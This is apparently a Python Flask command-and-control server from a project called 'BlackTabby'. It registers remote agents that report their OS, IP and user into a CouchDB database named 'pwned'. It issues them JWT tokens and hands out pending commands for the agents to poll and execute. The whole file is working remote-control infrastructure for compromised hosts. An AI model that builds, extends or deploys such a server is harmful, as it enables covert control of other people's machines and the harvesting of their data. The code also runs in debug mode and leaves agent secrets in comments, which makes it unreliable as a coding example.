from flask import Flask, jsonify, request
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token,
    jwt_refresh_token_required, create_refresh_token,
    get_jwt_identity
)
import json
import sys
import couchdb
import datetime

app = Flask(__name__)

app.config['JWT_SECRET_KEY'] = sys.argv[5] # json web token is set in setup.sh
jwt = JWTManager(app)
user_agent_secret = sys.argv[6]
agent_secret = sys.argv[7]
#user_agent_secret = "QmxhY2tUYWJieQo="
#agent_secret = "TGVhcm5pbmdDVG9CRWxpdGUK"

def generate_token(agent_id):
	access_token = create_access_token(identity=agent_id)
	return access_token

def gen_refresh_token(agent_id):
	refresh_token = create_refresh_token(identity=agent_id)
	return refresh_token

def connect_db():
	dbuser = sys.argv[1]
	dbpass = sys.argv[2]
	db_ip = sys.argv[3]
	db_port = sys.argv[4]
	try:
	  couchserver = couchdb.Server("http://{}:{}@{}:{}".format(dbuser,dbpass,db_ip,db_port))
	  db_connection = couchserver['pwned']
	  return db_connection
	  ### RETURN THE DB CONNECTION THEN USE IN FIRST CHECKIN FUNCTION ###

	except:
		return jsonify({"Error":"CouchDB Server Not up or pwned db not setup, start the couchdb docker container and run the setup script"})


@app.route("/poll",methods = ['POST','GET'])
@jwt_required
def polling():
	if request.method == 'GET':
	  agent_id = get_jwt_identity()
	  doc_id = request.headers['doc_id']
	  db_conn = connect_db()
	  print(dict(db_conn[doc_id]))
	  return jsonify(dict(db_conn[doc_id])) ## returns database document
	  '''
	  AGENT GET REQUEST EVERY 10 SECONDS, If something in pending commands grab and run that
	  pending commands is list of strings
	  '''
	if request.method == 'POST':
		if not request.is_json:
		  return jsonify({"Error":"Unauthorized"})
		agent_id = get_jwt_identity()
		doc_id = request.headers['doc_id']
		db_conn = connect_db()
		doc = dict(db_conn[doc_id])
		content = request.get_json()
		print(content) ## posted json from agent
		db_conn.save(content) 
		## posted json from agent can be sent exactly back into the database
		## agents will move the pending command json to completed command json array
		## so this endpoint just sends it to the db
		return jsonify(content)

	return None




@app.route('/first_check_in', methods = ['POST'])
def first_checkin():
	print(request)
	headers = request.headers
	print(headers)
	if not request.is_json:
		return jsonify({"Error":"Unauthorized"})
	print
	if headers.get("User-Agent") != user_agent_secret: ### BlackTabby Base64 Encoded
		return jsonify({"Error":"Unauthorized"})
	if headers.get("Agent") != agent_secret: ###Base64 LearningCToBElite
		return jsonify({"Error":"Unauthorized"})
	## gather parameters from json ##
	print(request.get_json())
	try:
	  content = request.get_json()
	  agent_id = content['agent_id']
	  os = content['os']
	  ip = content['ip']
	  user = content['user']
	  completed_commands = content['completed_commands']
	  pending_commands = content['pending_commands']
	  token = generate_token(agent_id)
	  refresh_token = gen_refresh_token(agent_id)
	  db_con = connect_db()
	  doc_id, doc_rev = db_con.save(content) ## posting check in doc to database
	  return jsonify({"id":doc_id,"rev":doc_rev,"refresh":refresh_token,"token":token}) # returns access token as awell as document id and doc rev to be used for updating

	except Exception as e:
	  print("\n  {}  \n".format(e))
	  return jsonify({"Error":"Missing Parameters"})


@app.route('/refresh',methods = ['GET'])
@jwt_refresh_token_required
def refresh():
	agent_id= get_jwt_identity()
	new_token = create_access_token(identity=agent_id)
	return jsonify({'token':new_token})






app.run(host='0.0.0.0',debug=True,port=9000,ssl_context='adhoc')
#ssl_context='adhoc'



